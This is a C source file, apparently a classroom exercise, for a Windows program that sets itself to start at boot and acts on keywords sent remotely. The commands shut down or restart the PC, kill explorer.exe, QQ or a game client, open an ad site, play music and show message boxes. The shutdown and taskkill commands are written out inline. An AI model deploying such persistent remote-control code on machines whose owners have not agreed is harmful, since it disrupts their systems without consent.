#include<stdio.h>
#include<windows.h>
#include"itmojun.h"
//MessageBox系统函数的功能：弹出消息框的窗口。

#pragma comment(lib,"itmojun.lib")//AutoRun和GetPCCmd函数
#pragma comment(lib,"winmm.lib")//mciSendString函数
//引用当前工程目录下的itmojun.lib和系统库文件目录下的winmm.lib这两个库文件，

char g_caption[501];
char g_title[501];

DWORD WINAPI MsgBoxThr(LPVOID lpParam);

int main()
{
	char cmd[301];//存放从微笑端接收的消息
	AutoRun();//将程序设置为开机自动运行
	mciSendString("open bg.mp3 alias s",NULL,0,NULL);//打开指定音乐文件并指定其别名为s
	while(1)
	{
		GetPCCmd("konakona",cmd);
		printf("%s\n",cmd);
		if(strstr(cmd,"关机"))
		{
			WinExec("shutdown-s-0",0);
		}
		else if(strstr(cmd,"重启"))
		{
			WinExec("shutdown -r-t 0",0);
		}
		else if(strstr(cmd,"桌面"))
		{

			static int kill_flag=1;
			if(kill_flag)//消去桌面
				WinExec("taskkill /f /im explorer.exe",0);
			else//恢复桌面
				WinExec("C:\\Windows\\explorer.exe",1);
			kill_flag=!kill_flag;
		}
		else if(strstr(cmd,"结束QQ"))
		{
			WinExec("taskkill /f /im qq.exe",0);//QQ
		}
		else if(strstr(cmd,"结束英雄联盟"))
		{
			WinExec("taskkill /f /im client.exe",0);//英雄联盟
		}
		else if(strstr(cmd,"广告"))
		{
			WinExec("explorer http://itmojun.com",1);//打开广告
		}
		else if(strstr(cmd,"记事本"))
		{
			WinExec("notepad",1);//打开记事本
		}
		else if(strstr(cmd,"播放"))
		{
			mciSendString("play s repeat",NULL,0,NULL);//重复播放音乐
		}
		else if(strstr(cmd,"暂停"))
		{
			mciSendString("pause s",NULL,0,NULL);//暂停音乐
		}
		else if(strstr(cmd,"停止"))
		{
			mciSendString("close s",NULL,0,NULL);//暂停音乐
		}
		/*else if(strstr(cmd,"提示"))
		{
			//MessageBox(NULL,"a","提示框标题",b=1);
			MessageBox(NULL,"不会玩就不要玩","提示框标题",0);
		}*/
//strncmp函数：strncmp(s1,s2,size);比较s1,s2字符串的前size个字符.
//strlen函数：strlen(s1);返回字符串长度.
//strtok函数：切割字符串
		else if(strncmp(cmd,"提示",strlen("提示"))==0)

		{
			char*caption=NULL;
			char*title=NULL;
			strtok(cmd,"#");
			caption=strtok(NULL,"#");
			title=strtok(NULL,"#");

			if(caption==NULL)
				strcpy(g_caption,"");
			else 
				strcpy(g_caption,caption);
			if(title==NULL)
				strcpy(g_title,"");
			else
				strcpy(g_title,title);

			//CreateThread系统函数的功能：创建一个新线程
			CreateThread(NULL,0,MsgBoxThr,NULL,0,NULL);
			
		}
	Sleep(3000);//防止重复的信息，延迟3秒显示。
	}
	return 0;
}

//定义线程函数
DWORD WINAPI MsgBoxThr(LPVOID lpParam)
{
	MessageBox(NULL,g_caption,g_title,0);
	return 0;
}